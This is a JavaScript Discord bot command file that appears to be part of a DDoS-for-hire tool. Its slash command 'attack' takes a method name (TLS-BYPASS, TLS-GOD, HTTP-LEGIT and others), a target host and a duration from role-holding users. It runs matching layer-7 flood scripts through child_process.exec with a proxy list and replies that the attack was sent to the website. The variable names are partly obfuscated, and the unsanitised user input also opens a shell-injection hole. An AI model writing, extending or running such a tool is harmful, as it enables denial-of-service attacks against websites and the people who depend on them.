const {
    MessageEmbed
} = require('discord.js');
const ayarlar = require('../../ayarlar.json');
var version = ayarlar['versionbot'];
var img = ayarlar['img'];
var roleID = ayarlar['roleID'];
var photovip = ayarlar['photovip'];
var randomgif = photovip[Math['floor']((Math['random']() * photovip['length']))];
module['exports'] = {
        name: 'attack',
        description: 'T\u1EA5n c\xF4ng trang Web',
        type: 'CHAT_INPUT',
        options: [{
            name: 'methods',
            description: 'Ph\u01B0\u01A1ng ph\xE1p t\u1EA5n c\xF4ng',
            required: true,
            type: 'STRING',
            choices: [{
                name: `${'HTTP-LEGIT'}`,
                value: `${'HTTP-LEGIT'}`,
                inline: true
            }, {
                name: `${'TLS-BYPASS'}`,
                value: `${'TLS-BYPASS'}`,
                inline: true
            }, {
                name: `${'TLS-TELEDOG'}`,
                value: `${'TLS-TELEDOG'}`,
                inline: true
            },  {
                name: `${'TLS-GOD'}`,
                value: `${'TLS-GOD'}`,
                inline: true
            }, {
                name: `${'TLS-ZEUS'}`,
                value: `${'TLS-ZEUS'}`,
                inline: true
            }, ]
        }, {
            name: 'host',
            description: '\u0110\u1ECBa ch\u1EC9 t\u1EA5n c\xF4ng',
            required: true,
            type: 'STRING'
        }, {
            name: 'duration',
            description: 'Thoi gian tan cong',
            required: true,
            type: 'STRING'
        }],
        run: async(_0x3d71x6, _0x3d71x7) => {
                if (!_0x3d71x7['member']['roles']['cache']['has'](roleID)) {
            return _0x3d71x7['reply']({
                       embeds: [new MessageEmbed()['setColor']('RANDOM')['setDescription'](`${'Ch\u1EC9 c\xF3 <@&'}${roleID}${'> m\u1EDBi \u0111\u01B0\u1EE3c d\xF9ng l\u1EC7nh n\xE0y.'}`)['setFooter']({
                    text: '\xA9 Developer: NguyenThanh'
                })['setTimestamp']()]
            })
        }
                const _0x3d71x9 = _0x3d71x7['options']['getString']('methods');
                const _0x3d71xy = _0x3d71x7['options']['getString']('duration');
                const _0x3d71xa = _0x3d71x7['options']['getString']('host');                
        if (_0x3d71x9 === 'TLS-GOD') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${' '}${_0x3d71xa}${' '}${_0x3d71xy}${' 64 15 http.txt'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '🚀 **The Attack Was Sent To Website** 🚀',
                value: `${' '}${_0x3d71xa}${' '}`
            })['setImage'](randomgif)['setFooter']('\xA9 Developer: NguyenThanh', img)['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setTitle']('**WAITING...**')['setImage']('https://media2.giphy.com/media/mBiXF8LBUMBmaiIrJj/giphy.gif?cid=5e21488601ae79b24c76a3829eb0d2140e77bfb0681ca3af&rid=giphy.gif')['setFooter']('\xA9 Developer: NguyenThanh', img)['setTimestamp']();
            _0x3d71x7['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0x3d71x7['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }if (_0x3d71x9 === 'TLS-ZEUS'){
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' '}${_0x3d71xy}${' 64 15 http.txt'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '🚀 **The Attack Was Sent To Website** 🚀',
                value: `${' '}${_0x3d71xa}${' '}`
            })['setImage'](randomgif)['setFooter']('\xA9 Developer: NguyenThanh', img)['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setTitle']('**WAITING...**')['setImage']('https://media2.giphy.com/media/mBiXF8LBUMBmaiIrJj/giphy.gif?cid=5e21488601ae79b24c76a3829eb0d2140e77bfb0681ca3af&rid=giphy.gif')['setFooter']('\xA9 Developer: NguyenThanh', img)['setTimestamp']();
            _0x3d71x7['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0x3d71x7['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
        if (_0x3d71x9 === 'TLS-TELEDOG') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' '}${_0x3d71xy}${' 64 15 http.txt'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '🚀 **The Attack Was Sent To Website** 🚀',
                value: `${' '}${_0x3d71xa}${' '}`
            })['setImage'](randomgif)['setFooter']('\xA9 Developer: NguyenThanh', img)['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setTitle']('**WAITING...**')['setImage']('https://media2.giphy.com/media/mBiXF8LBUMBmaiIrJj/giphy.gif?cid=5e21488601ae79b24c76a3829eb0d2140e77bfb0681ca3af&rid=giphy.gif')['setFooter']('\xA9 Developer: NguyenThanh', img)['setTimestamp']();
            _0x3d71x7['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0x3d71x7['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
        if (_0x3d71x9 === 'HTTP-LEGIT') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' '}${_0x3d71xy}${' 1024 20 http.txt'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                name: '🚀 **The Attack Was Sent To Website** 🚀',
                value: `${' '}${_0x3d71xa}${' '}`
            })['setImage'](randomgif)['setFooter']('\xA9 Developer: NguyenThanh', img)['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setTitle']('**WAITING...**')['setImage']('https://media2.giphy.com/media/mBiXF8LBUMBmaiIrJj/giphy.gif?cid=5e21488601ae79b24c76a3829eb0d2140e77bfb0681ca3af&rid=giphy.gif')['setFooter']('\xA9 Developer: NguyenThanh', img)['setTimestamp']();
            _0x3d71x7['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0x3d71x7['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
                if (_0x3d71x9 === 'TLS-BYPASS') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js GET '}${_0x3d71xa}${' http.txt'}${' '}${_0x3d71xy}${' 1024 15'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '🚀 **The Attack Was Sent To Website** 🚀',
                value: `${' '}${_0x3d71xa}${' '}`
            })['setImage'](randomgif)['setFooter']('\xA9 Developer: NguyenThanh', img)['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setTitle']('**WAITING...**')['setImage']('https://media2.giphy.com/media/mBiXF8LBUMBmaiIrJj/giphy.gif?cid=5e21488601ae79b24c76a3829eb0d2140e77bfb0681ca3af&rid=giphy.gif')['setFooter']('\xA9 Developer: NguyenThanh', img)['setTimestamp']();
            _0x3d71x7['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0x3d71x7['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
        if (_0x3d71x9 === 'SUPER-SPAM') {
                    var _0x3d71xb = _0x3d71x9;
                    var _0x3d71xc = require('child_process')['exec'];
                    _0x3d71xc(`${'node methods/L7/'}${_0x3d71xb}${'.js '}${_0x3d71xa}${' 120 60 2 http.txt'}`, (_0x3d71xd, _0x3d71xe, _0x3d71xf) => {});
                    console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0x3d71x7['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '🚀 **The Attack Was Sent To Website** 🚀',
                value: `${' '}${_0x3d71xa}${' '}`
            })['setImage'](randomgif)['setFooter']('\xA9 Developer: NguyenThanh', img)['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setTitle']('**WAITING...**')['setImage']('https://media2.giphy.com/media/mBiXF8LBUMBmaiIrJj/giphy.gif?cid=5e21488601ae79b24c76a3829eb0d2140e77bfb0681ca3af&rid=giphy.gif')['setFooter']('\xA9 Developer: NguyenThanh', img)['setTimestamp']();
            _0x3d71x7['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0x3d71x7['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }}}